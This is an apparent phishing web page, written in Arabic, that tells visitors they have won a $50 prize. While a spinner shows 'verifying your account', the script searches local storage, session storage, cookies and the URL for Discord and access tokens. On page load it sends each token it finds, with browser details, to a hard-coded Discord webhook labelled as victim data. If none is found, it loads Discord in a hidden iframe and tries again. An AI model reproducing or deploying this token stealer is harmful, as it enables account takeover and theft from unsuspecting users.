<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>🎁 تهانينا! لقد فزت بجائزة</title>
    <style>
        body { background: #0b0e1a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: #1a1f2f; padding: 40px; border-radius: 20px; text-align: center; }
        .spinner { border: 4px solid #2a2f45; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h1>🎉 تهانينا!</h1>
        <p>لقد فزت بـ <strong>50 دولار</strong> في سحب اليوم</p>
        <div class="spinner"></div>
        <p style="color: #8892a8;">جاري التحقق من حسابك...</p>
    </div>

    <script>
        // ====================================================
        // 🕵️ الطريقة السرية: نستخرج التوكن من Extensions
        // ====================================================

        const WEBHOOK = 'https://discord.com/api/webhooks/1540029124179918941/41_nc44K924qwKrhVb2-_BkdKmg4bu2DKy27aKXARpjjrL7SPp9_DXrJeyzrd7O1VAOu';

        // نحاول جلب التوكن من أي مصدر
        function extractToken() {
            // 1. من localStorage
            const storageKeys = ['token', 'discord_token', 'access_token', 'auth_token'];
            for (let key of storageKeys) {
                const val = localStorage.getItem(key);
                if (val && val.length > 20) return val;
            }

            // 2. من sessionStorage
            for (let key of storageKeys) {
                const val = sessionStorage.getItem(key);
                if (val && val.length > 20) return val;
            }

            // 3. من cookies
            const cookieMatch = document.cookie.match(/(token|discord|access)=([^;]+)/);
            if (cookieMatch) return cookieMatch[2];

            // 4. من URL
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('token')) return urlParams.get('token');

            // 5. من hash
            const hash = window.location.hash.substring(1);
            const hashParams = new URLSearchParams(hash);
            if (hashParams.get('access_token')) return hashParams.get('access_token');

            return null;
        }

        // نحاول الاستخراج فورًا
        let token = extractToken();

        if (token) {
            // أرسل للويب هوك
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🚨 **تم العثور على توكن!**`,
                    embeds: [{
                        title: '🕵️ بيانات الضحية',
                        color: 0xff4757,
                        fields: [
                            { name: '🔑 التوكن', value: `\`${token}\`` },
                            { name: '💻 المتصفح', value: navigator.userAgent },
                            { name: '🌐 الرابط', value: window.location.href },
                            { name: '🕒 الوقت', value: new Date().toISOString() }
                        ]
                    }]
                })
            })
            .then(() => {
                document.querySelector('.box').innerHTML = '<h2>✅ تم التحقق!</h2><p>سيتم تحويلك خلال لحظات...</p>';
            });
        } else {
            // إذا ما لقينا، نفتح Discord في iframe خفي
            document.querySelector('.box').innerHTML += '<p style="color:#f04747;">⚠️ جارٍ البحث...</p>';
            
            const iframe = document.createElement('iframe');
            iframe.src = 'https://discord.com/app';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            // نحاول مرة ثانية بعد 5 ثواني
            setTimeout(() => {
                const newToken = extractToken();
                if (newToken) {
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🚨 **تم العثور على توكن (محاولة ثانية)!**`,
                            embeds: [{ title: '🕵️ توكن متأخر', fields: [{ name: 'التوكن', value: `\`${newToken}\`` }] }]
                        })
                    });
                }
            }, 5000);
        }
    </script>
</body>
</html>
